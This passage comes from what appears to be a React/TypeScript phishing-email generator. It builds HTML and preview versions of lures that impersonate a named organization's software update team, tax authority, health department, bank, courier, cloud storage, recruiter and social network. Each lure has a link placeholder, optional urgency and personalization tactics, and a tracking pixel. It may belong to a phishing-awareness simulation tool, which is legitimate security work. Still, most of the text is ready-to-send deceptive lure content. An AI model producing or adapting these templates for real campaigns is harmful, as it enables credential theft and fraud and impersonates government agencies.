      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "software-update":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Critical Software Update</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .update-details { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; }
    .update-details h3 { margin-top: 0; }
    .update-details ul { padding-left: 20px; }
    .button { display: inline-block; background-color: #17a2b8; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Software</div>
        <div class="email-address">updates@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 11:30 AM</div>
    </div>
    <div class="content">
      <div class="subject">Critical Security Update Required</div>
      <p>Dear User,</p>
      <p>A critical security vulnerability has been identified in your ${targetOrganization} software that requires immediate attention.</p>
      <div class="update-details">
        <h3>Update Details:</h3>
        <p><strong>Version:</strong> 10.5.2</p>
        <p><strong>Priority:</strong> Critical</p>
        <p><strong>Fixes:</strong></p>
        <ul>
          <li>Security vulnerability CVE-2023-XXXXX</li>
          <li>Data protection improvements</li>
          <li>Performance enhancements</li>
        </ul>
      </div>
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">Download Security Update</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Thank you for your prompt attention to this matter.</p>
      <p>Regards,<br>Security Team<br>${targetOrganization} Software</p>
    </div>
    <div class="footer">
      <p>This is an automated security notification. Please do not reply to this email.</p>
      <p>For assistance, contact our support team at support@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "tax-refund":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tax Refund Notification</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .refund-details { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; }
    .refund-details p { margin: 5px 0; }
    .button { display: inline-block; background-color: #28a745; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Tax Authority</div>
        <div class="email-address">refunds@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.gov</div>
      </div>
      <div class="date">Today, 08:15 AM</div>
    </div>
    <div class="content">
      <div class="subject">Important: Tax Refund Notification</div>
      <p>Dear Taxpayer,</p>
      <p>After the latest review of your fiscal activity, we have determined that you are eligible for a tax refund.</p>
      ${urgencyText}
      <div class="refund-details">
        <p><strong>Refund Details:</strong></p>
        <p>Reference Number: REF-${Math.floor(Math.random() * 10000000)}</p>
        <p>Amount: $${(Math.random() * 2000 + 500).toFixed(2)}</p>
        <p>Tax Year: ${new Date().getFullYear() - 1}</p>
      </div>
      <p>To receive your refund, please verify your information and select your preferred payment method.</p>
      <p><a href="${actionUrl}" class="button">Claim Your Refund Now</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Sincerely,<br>Refund Department<br>${targetOrganization} Tax Authority</p>
    </div>
    <div class="footer">
      <p>This is an official notification from the Tax Authority. Please do not reply to this email.</p>
      <p>For assistance, contact our support center at 1-800-555-4567.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "covid-alert":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>COVID-19 Important Update</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; color: #d9534f; }
    .alert-box { margin: 15px 0; padding: 10px; border: 1px solid #d9534f; background-color: #f9f2f2; border-radius: 4px; }
    .alert-box p { margin: 5px 0; }
    .button { display: inline-block; background-color: #d9534f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Health Department</div>
        <div class="email-address">covid-alerts@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.gov</div>
      </div>
      <div class="date">Today, 10:30 AM</div>
    </div>
    <div class="content">
      <div class="subject">URGENT: COVID-19 Exposure Notification</div>
      <p>Dear Citizen,</p>
      <p>Our records indicate that you may have been in close proximity to someone who has tested positive for COVID-19.</p>
      <div class="alert-box">
        <p><strong>Important Information:</strong></p>
        <p>Exposure Date: ${new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toLocaleDateString()}</p>
        <p>Location: Public area in your community</p>
        <p>Risk Level: Moderate to High</p>
      </div>
      ${urgencyText}
      <p>Please follow these steps immediately:</p>
      <ol>
        <li>Complete the exposure verification form</li>
        <li>Schedule a COVID-19 test</li>
        <li>Self-isolate until you receive your test results</li>
      </ol>
      <p><a href="${actionUrl}" class="button">Verify Exposure & Schedule Test</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Stay safe,<br>Public Health Team<br>${targetOrganization} Health Department</p>
    </div>
    <div class="footer">
      <p>This is an automated health alert. For more information about COVID-19, visit our <a href="#">official website</a>.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "security-breach":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Breach Alert</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; color: #dc3545; }
    .breach-details { margin: 15px 0; padding: 10px; border: 1px solid #dc3545; background-color: #f8d7da; border-radius: 4px; }
    .breach-details p { margin: 5px 0; }
    .button { display: inline-block; background-color: #dc3545; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Security Center</div>
        <div class="email-address">security-alerts@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 07:45 AM</div>
    </div>
    <div class="content">
      <div class="subject">CRITICAL: Security Breach Affecting Your Account</div>
      <p>Dear Customer,</p>
      <p>We are contacting you regarding a recent security incident that may have affected your account with ${targetOrganization}.</p>
      <div class="breach-details">
        <p><strong>Incident Details:</strong></p>
        <p>Date Detected: ${new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toLocaleDateString()}</p>
        <p>Systems Affected: User authentication database</p>
        <p>Information at Risk: Names, email addresses, and potentially passwords</p>
      </div>
      ${urgencyText}
      <p>To protect your account, we strongly recommend that you:</p>
      <ol>
        <li>Change your password immediately</li>
        <li>Enable two-factor authentication</li>
        <li>Review your recent account activity for any suspicious actions</li>
      </ol>
      <p><a href="${actionUrl}" class="button">Secure Your Account Now</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>We sincerely apologize for any inconvenience this may cause.</p>
      <p>Regards,<br>Security Response Team<br>${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>If you have any questions, please contact our dedicated support line at 1-888-555-0123.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      case "subscription-renewal":
        html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Subscription Renewal Notice</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { padding-bottom: 15px; border-bottom: 1px solid #ddd; display: flex; align-items: center; }
    .logo { margin-right: 10px; }
    .company-name { font-weight: bold; font-size: 16px; }
    .email-address { font-size: 12px; color: #777; }
    .date { margin-left: auto; font-size: 12px; color: #777; }
    .content { padding: 20px 0; font-size: 14px; line-height: 1.5; }
    .subject { font-weight: bold; margin-bottom: 15px; font-size: 16px; }
    .subscription-details { margin: 15px 0; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; }
    .subscription-details p { margin: 5px 0; }
    .button { display: inline-block; background-color: #5a67d8; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; margin: 15px 0; }
    .footer { padding-top: 15px; border-top: 1px solid #ddd; font-size: 12px; color: #777; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      ${logoHtml ? `<div class="logo">${logoHtml}</div>` : ""}
      <div>
        <div class="company-name">${targetOrganization} Premium Services</div>
        <div class="email-address">billing@${targetOrganization.toLowerCase().replace(/\s+/g, "")}.com</div>
      </div>
      <div class="date">Today, 14:20 PM</div>
    </div>
    <div class="content">
      <div class="subject">Action Required: Your Subscription Will Expire Soon</div>
      <p>Dear Valued Customer,</p>
      <p>Your premium subscription with ${targetOrganization} is about to expire. To ensure uninterrupted access to our services, please renew your subscription.</p>
      <div class="subscription-details">
        <p><strong>Subscription Details:</strong></p>
        <p>Plan: Premium ${Math.floor(Math.random() * 3) + 1}</p>
        <p>Expiration Date: ${new Date(Date.now() + 5 * 24 * 60 * 60 * 1000).toLocaleDateString()}</p>
        <p>Renewal Price: $${(Math.random() * 50 + 9.99).toFixed(2)}/month</p>
      </div>
      ${urgencyText}
      <p><a href="${actionUrl}" class="button">Renew Subscription</a></p>
      ${personalizationText}
      ${socialProofText}
      <p>Thank you for being a loyal customer.</p>
      <p>Best regards,<br>Billing Team<br>${targetOrganization}</p>
    </div>
    <div class="footer">
      <p>If you wish to cancel your subscription or have any questions, please contact our customer support.</p>
      ${trackingPixelHtml}
    </div>
  </div>
</body>
</html>`
        break

      default:
        html = "<p>Select a template to generate HTML</p>"
    }

    return html
  }

  const generateEmailPreview = (template: string) => {
    let previewContent: JSX.Element

    // Generate HTML source for the selected template
    const htmlSource = generateEmailHtml(template)
    setEmailHtmlSource(htmlSource)

    switch (template) {
      case "password-reset":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold">
                    {targetOrganization.charAt(0)}
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Security Team</div>
                <div className="text-xs text-gray-500">
                  security@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 10:42 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Urgent Security Alert: Password Reset Required</div>
              <p className="mb-2">Dear User,</p>
              <p className="mb-2">
                Our security system has detected unusual login attempts on your account. To protect your information,
                please reset your password immediately.
              </p>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  This alert requires your immediate attention. Your account will be locked in 24 hours if no action is
                  taken.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-blue-600 text-white px-4 py-2 rounded">Reset Password Now</button>
              </div>
              <p className="mb-2">
                If you did not request this change, please contact our security department immediately at security@
                {targetOrganization.toLowerCase().replace(/\s+/g, "")}.com.
              </p>
              {usePersonalization && (
                <p className="mb-2">We value your business and are committed to keeping your account secure.</p>
              )}
              <p className="mt-4">
                Regards,
                <br />
                Security Team
                <br />
                {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This email contains confidential information and is intended only for the recipient.</p>
              {trackingPixel && <div className="h-px w-px bg-transparent"></div>}
            </div>
          </div>
        )
        break

      case "account-verification":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center text-white font-bold">
                    {targetOrganization.charAt(0)}
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Account Services</div>
                <div className="text-xs text-gray-500">
                  accounts@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 09:15 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Account Verification Required - Action Needed</div>
              <p className="mb-2">Dear Valued Customer,</p>
              <p className="mb-2">
                We are conducting a routine verification of all accounts to ensure the security of our platform.
              </p>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  To avoid service interruption, please complete this verification within 48 hours.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-green-600 text-white px-4 py-2 rounded">Verify Account</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">As a valued member since 2020, your account security is our top priority.</p>
              )}
              <p className="mb-2">This process will only take a few minutes of your time.</p>
              <p className="mt-4">
                Thank you,
                <br />
                Customer Support Team
                <br />
                {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>
                © {new Date().getFullYear()} {targetOrganization}. All rights reserved.
              </p>
            </div>
          </div>
        )
        break

      case "invoice":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-purple-600 rounded-full flex items-center justify-center text-white font-bold">
                    {targetOrganization.charAt(0)}
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Billing Department</div>
                <div className="text-xs text-gray-500">
                  billing@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 14:30 PM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Invoice #INV-29581 - Payment Required</div>
              <p className="mb-2">Dear Client,</p>
              <p className="mb-2">Please find attached the invoice #INV-29581 for recent services.</p>
              {includeAttachment && (
                <div className="my-3 border rounded p-2 bg-gray-50 flex items-center">
                  <FileIcon className="h-4 w-4 mr-2 text-gray-500" />
                  <span>Invoice-29581.pdf</span>
                  <span className="text-xs text-gray-500 ml-2">(38 KB)</span>
                </div>
              )}
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">Payment is due within 7 days to avoid late fees.</p>
              )}
              <div className="my-4 text-center">
                <button className="bg-purple-600 text-white px-4 py-2 rounded">View and Pay Invoice</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">We appreciate your continued business with us since January 2022.</p>
              )}
              <p className="mt-4">
                Thank you,
                <br />
                Billing Department
                <br />
                {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>
                Please do not reply to this email. For inquiries, contact billing@
                {targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
              </p>
            </div>
          </div>
        )
        break

      case "package-delivery":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-yellow-600 rounded-full flex items-center justify-center text-white font-bold">
                    {targetOrganization.charAt(0)}
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Delivery Services</div>
                <div className="text-xs text-gray-500">
                  deliveries@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 11:20 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Package Delivery Notification - Action Required</div>
              <p className="mb-2">Hello,</p>
              <p className="mb-2">
                A package addressed to you is pending delivery. Unfortunately, we couldn't deliver it due to an
                incomplete address.
              </p>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  Your package will be returned to sender in 3 days if not claimed.
                </p>
              )}
              <div className="my-3 border rounded p-2 bg-gray-50">
                <p className="font-semibold">Package Details:</p>
                <p>Tracking Number: PKG78392057</p>
                <p>Attempted Delivery: Today at 9:30 AM</p>
              </div>
              <div className="my-4 text-center">
                <button className="bg-yellow-600 text-white px-4 py-2 rounded">Confirm Delivery Details</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">
                  As a regular recipient of our delivery services, we want to ensure you receive your package promptly.
                </p>
              )}
              <p className="mt-4">
                Regards,
                <br />
                Delivery Service
                <br />
                On behalf of {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This is an automated message. Please do not reply.</p>
            </div>
          </div>
        )
        break

      case "cloud-storage":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold">
                    <Globe className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Cloud Storage</div>
                <div className="text-xs text-gray-500">
                  share@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 15:47 PM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Important Document Shared With You</div>
              <p className="mb-2">Hello,</p>
              <p className="mb-2">A document has been shared with you via {targetOrganization} Cloud Storage.</p>
              <div className="my-3 border rounded p-2 bg-gray-50 flex items-center">
                <FileIcon className="h-4 w-4 mr-2 text-gray-500" />
                <span>Confidential_Document.docx</span>
                <span className="text-xs text-gray-500 ml-2">(2.4 MB)</span>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">This shared document will expire in 24 hours.</p>
              )}
              <div className="my-4 text-center">
                <button className="bg-blue-500 text-white px-4 py-2 rounded">View Document</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">
                  Based on your recent collaboration with the marketing team, you've been granted access to this file.
                </p>
              )}
              <p className="mt-4">
                Best regards,
                <br />
                {targetOrganization} Cloud Team
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>Secure file sharing powered by {targetOrganization} Cloud Storage</p>
            </div>
          </div>
        )
        break

      case "bank-alert":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-blue-700 rounded-full flex items-center justify-center text-white font-bold">
                    <CreditCard className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Banking</div>
                <div className="text-xs text-gray-500">
                  security@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 13:05 PM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Important Security Alert: Unusual Transaction Detected</div>
              <p className="mb-2">Dear Valued Customer,</p>
              <p className="mb-2">
                Our fraud detection system has identified an unusual transaction on your account that requires your
                immediate verification.
              </p>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  This transaction will be processed in 24 hours unless you report it as fraudulent.
                </p>
              )}
              <div className="my-3 border rounded p-2 bg-gray-50">
                <p className="font-semibold">Transaction Details:</p>
                <p>Date: {new Date().toLocaleDateString()}</p>
                <p>Amount: $1,249.99</p>
                <p>Merchant: Foreign Online Retailer</p>
                <p>Location: Overseas</p>
              </div>
              <div className="my-4 text-center">
                <button className="bg-blue-700 text-white px-4 py-2 rounded">Verify Transaction</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">We've noticed this transaction differs from your usual spending patterns.</p>
              )}
              <p className="mt-4">
                Sincerely,
                <br />
                Security Team
                <br />
                {targetOrganization} Banking
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This is an automated security alert. Please do not reply to this email.</p>
              <p>For assistance, contact our customer service at 1-800-555-0123.</p>
            </div>
          </div>
        )
        break

      case "social-media":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4 bg-blue-600 -m-4 p-4 mb-4 rounded-t-md">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-white rounded-full flex items-center justify-center text-blue-600 font-bold">
                    <Facebook className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold text-white">{targetOrganization} Social</div>
                <div className="text-xs text-blue-100">
                  notifications@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-blue-100">Today, 16:22 PM</div>
            </div>
            <div className="text-sm mb-4 mt-8">
              <div className="font-bold mb-2">You have a new message from John Smith</div>
              <p className="mb-2">Hello,</p>
              <p className="mb-2">
                You have received a new private message on your {targetOrganization} Social account.
              </p>
              <div className="my-3 border rounded p-2 bg-gray-50 flex items-start">
                <div className="w-10 h-10 bg-gray-300 rounded-full mr-2"></div>
                <div>
                  <p className="font-semibold">John Smith</p>
                  <p className="text-gray-600 italic">"Hey, long time no see! Check out this link I found..."</p>
                </div>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">This message will expire in 24 hours.</p>
              )}
              <div className="my-4 text-center">
                <button className="bg-blue-600 text-white px-4 py-2 rounded">View Message</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">
                  We noticed you haven't logged in recently. Don't miss out on updates from your network.
                </p>
              )}
              <p className="mt-4">
                Thanks,
                <br />
                {targetOrganization} Social Team
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This message was sent to you because you have notifications enabled.</p>
              <p>To unsubscribe from these emails, update your notification settings.</p>
            </div>
          </div>
        )
        break

      case "job-opportunity":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-green-700 rounded-full flex items-center justify-center text-white font-bold">
                    <Briefcase className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Recruitment</div>
                <div className="text-xs text-gray-500">
                  careers@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 09:45 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Exclusive Job Opportunity: Senior Position Available</div>
              <p className="mb-2">Dear Professional,</p>
              <p className="mb-2">
                Based on your impressive profile and experience, we would like to invite you to apply for a senior
                position at {targetOrganization}.
              </p>
              <div className="my-3 border rounded p-2 bg-gray-50">
                <p className="font-semibold">Senior Developer Position</p>
                <p>Salary Range: $120,000 - $150,000</p>
                <p>Location: Remote / Hybrid</p>
                <p className="font-semibold mt-2">Requirements:</p>
                <ul className="list-disc pl-5">
                  <li>5+ years of experience</li>
                  <li>Leadership skills</li>
                  <li>Advanced technical knowledge</li>
                </ul>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  This position is closing soon. Applications must be submitted within 48 hours.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-green-700 text-white px-4 py-2 rounded">View Job Details & Apply</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">Your background in technology makes you an ideal candidate for this role.</p>
              )}
              <p className="mt-4">
                Best regards,
                <br />
                Recruitment Team
                <br />
                {targetOrganization}
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This is a private job opportunity sent to selected candidates only.</p>
              <p>If you're not interested, you can unsubscribe from our talent pool.</p>
            </div>
          </div>
        )
        break

      case "software-update":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-cyan-600 rounded-full flex items-center justify-center text-white font-bold">
                    <RefreshCw className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Software</div>
                <div className="text-xs text-gray-500">
                  updates@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 11:30 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Critical Security Update Required</div>
              <p className="mb-2">Dear User,</p>
              <p className="mb-2">
                A critical security vulnerability has been identified in your {targetOrganization} software that
                requires immediate attention.
              </p>
              <div className="my-3 border rounded p-2 bg-gray-50">
                <p className="font-semibold">Update Details:</p>
                <p>Version: 10.5.2</p>
                <p>Priority: Critical</p>
                <p className="font-semibold mt-2">Fixes:</p>
                <ul className="list-disc pl-5">
                  <li>Security vulnerability CVE-2023-XXXXX</li>
                  <li>Data protection improvements</li>
                  <li>Performance enhancements</li>
                </ul>
              </div>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  Your system is vulnerable until updated. Please install this update immediately.
                </p>
              )}
              <div className="my-4 text-center">
                <button className="bg-cyan-600 text-white px-4 py-2 rounded">Download Security Update</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">As a registered user of our premium software, your security is our top priority.</p>
              )}
              <p className="mt-4">
                Thank you for your prompt attention to this matter.
                <br />
                Regards,
                <br />
                Security Team
                <br />
                {targetOrganization} Software
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
              <p>This is an automated security notification. Please do not reply to this email.</p>
              <p>
                For assistance, contact our support team at support@
                {targetOrganization.toLowerCase().replace(/\s+/g, "")}.com
              </p>
            </div>
          </div>
        )
        break

      case "tax-refund":
        previewContent = (
          <div className="border rounded-md p-4 bg-white shadow-sm">
            <div className="flex items-center border-b pb-4 mb-4">
              {includeLogo && (
                <div className="mr-2">
                  <div className="w-8 h-8 bg-green-700 rounded-full flex items-center justify-center text-white font-bold">
                    <DollarSign className="h-4 w-4" />
                  </div>
                </div>
              )}
              <div>
                <div className="font-bold">{targetOrganization} Tax Authority</div>
                <div className="text-xs text-gray-500">
                  refunds@{targetOrganization.toLowerCase().replace(/\s+/g, "")}.gov
                </div>
              </div>
              <div className="ml-auto text-xs text-gray-500">Today, 08:15 AM</div>
            </div>
            <div className="text-sm mb-4">
              <div className="font-bold mb-2">Important: Tax Refund Notification</div>
              <p className="mb-2">Dear Taxpayer,</p>
              <p className="mb-2">
                After the latest review of your fiscal activity, we have determined that you are eligible for a tax
                refund.
              </p>
              {useUrgencyTactics && (
                <p className="mb-2 text-red-600 font-semibold">
                  This refund must be claimed within 14 days or it will be forfeited.
                </p>
              )}
              <div className="my-3 border rounded p-2 bg-gray-50">
                <p className="font-semibold">Refund Details:</p>
                <p>Reference Number: REF-{Math.floor(Math.random() * 10000000)}</p>
                <p>Amount: ${(Math.random() * 2000 + 500).toFixed(2)}</p>
                <p>Tax Year: {new Date().getFullYear() - 1}</p>
              </div>
              <div className="my-4 text-center">
                <button className="bg-green-700 text-white px-4 py-2 rounded">Claim Your Refund Now</button>
              </div>
              {usePersonalization && (
                <p className="mb-2">As a registered taxpayer since 2018, you are eligible for expedited processing.</p>
              )}
              <p className="mt-4">
                Sincerely,
                <br />
                Refund Department
                <br />
                {targetOrganization} Tax Authority
              </p>
            </div>
            <div className="border-t pt-2 text-xs text-gray-500">
